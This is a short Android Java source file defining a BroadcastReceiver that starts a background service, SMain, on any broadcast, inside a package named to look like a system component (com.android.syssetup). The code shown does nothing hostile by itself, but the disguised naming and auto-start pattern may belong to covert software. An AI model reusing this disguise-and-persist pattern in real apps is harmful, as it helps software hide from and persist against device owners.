package com.android.syssetup;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.android.syssetup.auto.Cfg;
import com.android.syssetup.util.Check;

/**
 * The Class BroadcastMonitor.
 */
public class Broad extends BroadcastReceiver {
	private static final String TAG = "BroadcastMonitor"; //$NON-NLS-1$

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context,
	 * android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		// Toast.makeText(context, "BroadcastMonitor Intent Received",
		// Toast.LENGTH_LONG).show();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onReceive): starting intent"); //$NON-NLS-1$
		} else {
		}

		// le due righe seguenti potrebbero diventare:
		final Intent serviceIntent = new Intent(context, SMain.class);
		context.startService(serviceIntent);
	}
}